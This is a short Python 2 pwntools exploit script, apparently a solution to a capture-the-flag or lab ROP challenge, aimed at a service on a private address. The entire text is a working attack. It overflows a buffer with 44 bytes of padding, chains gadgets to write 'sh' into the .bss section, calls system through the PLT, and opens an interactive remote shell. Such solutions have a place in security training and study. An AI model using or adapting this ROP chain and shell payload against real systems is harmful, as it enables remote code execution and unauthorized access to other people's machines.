#!/usr/bin/env python2
'''
Put 'sh\x00\x00' into edx
Write the data in edx into the address stored in ecx
'''
from pwn import *

# remote connection
p = remote("192.168.56.102", 8888)


# useful address
bss_section = p32(0x0804a040)
system_plt = p32(0x08048430)

# gadgets
mov_lecx_edx = p32(0x08048693) # pop ebp; pop ebx; xor byte[ecx], bl; ret
xor_edx_edx = p32(0x08048671) # pop esi; mov ebp,0xcafebabe; ret
xor_edx_ebx = p32(0x0804867b) # pop ebp; mov edi,0xdeadbabe; ret
xchg_edx_ecx = p32(0x08048689) # pop ebp; mov edx,0xdefaced0; ret
pop_ebx = p32(0x08048716)

# helper function
def write_data(data, addr):
    # addr -> ecx
    buf = xor_edx_edx
    buf += "AAAA"
    buf += pop_ebx
    buf += addr
    buf += xor_edx_ebx
    buf += "AAAA"
    buf += xchg_edx_ecx
    buf += "AAAA"
    # data -> edx
    buf += xor_edx_edx
    buf += "AAAA"
    buf += pop_ebx
    buf += data
    buf += xor_edx_ebx
    buf += "AAAA"
    # data -> ecx
    buf += mov_lecx_edx
    buf += "AAAA"
    buf += p32(0)
    return buf
payload = "A"*44
payload += write_data("sh\x00\x00", bss_section)
payload += system_plt
payload += "AAAA"
payload += bss_section
print p.recvuntil('>')
p.sendline(payload)
p.interactive()
